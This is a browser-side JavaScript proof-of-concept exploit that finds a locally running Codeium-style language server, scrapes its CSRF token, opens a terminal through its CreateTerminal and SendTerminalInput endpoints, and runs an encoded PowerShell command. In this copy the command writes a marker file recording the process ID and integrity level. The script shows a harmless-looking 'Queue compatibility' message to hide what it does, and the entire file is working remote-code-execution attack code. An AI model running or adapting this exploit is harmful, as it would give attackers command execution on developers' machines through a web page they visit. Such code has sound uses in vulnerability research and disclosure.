(async () => {
  const status = document.querySelector("#status");
  const log = (value) => {
    if (status) status.textContent += value + "\n";
  };
  const candidates = Array.isArray(window.queueLanguageServerCandidates)
    ? window.queueLanguageServerCandidates
    : [];
  const utf16leBase64 = (value) => {
    let bytes = "";
    for (let i = 0; i < value.length; i++) {
      const code = value.charCodeAt(i);
      bytes += String.fromCharCode(code & 0xff, code >>> 8);
    }
    return btoa(bytes);
  };
  const extractCsrf = (html) => {
    const match = html.match(/"csrfToken"\s*:\s*"((?:\\.|[^"\\])*)"/i);
    return match ? JSON.parse('"' + match[1] + '"') : "";
  };
  const headersFor = (csrf) => ({
    "Content-Type": "application/json",
    "Connect-Protocol-Version": "1",
    "x-codeium-csrf-token": csrf
  });

  for (const base of candidates) {
    try {
      const root = await fetch(base + "/", {mode: "cors", credentials: "include", cache: "no-store"});
      const html = await root.text();
      if (!root.ok) continue;
      const csrf = extractCsrf(html);
      if (!csrf) continue;
      log("root=" + root.status);
      const create = await fetch(base + "/exa.language_server_pb.LanguageServerService/CreateTerminal", {
        method: "POST", mode: "cors", credentials: "include", headers: headersFor(csrf),
        body: JSON.stringify({workspaceUri: "file:///C:/Users/Sivanesh/Documents"})
      });
      const created = await create.json();
      const terminal = created.terminal || created;
      log("create=" + create.status);
      if (!create.ok || !terminal.terminalId) continue;
      const script =
        "$p=Join-Path $env:USERPROFILE 'antigravity-git-history-browser-rce.txt';" +
        "$il=((whoami.exe /groups|Select-String -SimpleMatch 'Mandatory Label'|Select-Object -First 1).Line);" +
        "$v=@('ANTIGRAVITY_GIT_HISTORY_BROWSER_RCE','PID='+$PID,'INTEGRITY='+$il);" +
        "[IO.File]::WriteAllLines($p,$v);";
      const command = "powershell.exe -NoLogo -NoProfile -NonInteractive -EncodedCommand " +
        utf16leBase64(script) + "\r\n";
      const input = await fetch(base + "/exa.language_server_pb.LanguageServerService/SendTerminalInput", {
        method: "POST", mode: "cors", credentials: "include", headers: headersFor(csrf),
        body: JSON.stringify({
          terminalId: terminal.terminalId,
          inputStreamId: terminal.terminalId,
          input: btoa(command)
        })
      });
      log("input=" + input.status);
      if (input.ok) {
        document.body.firstChild.textContent = "Queue compatibility: current";
        return;
      }
    } catch (error) {
      log("candidate failed");
    }
  }
  document.body.firstChild.textContent = "Queue compatibility: unavailable";
})();
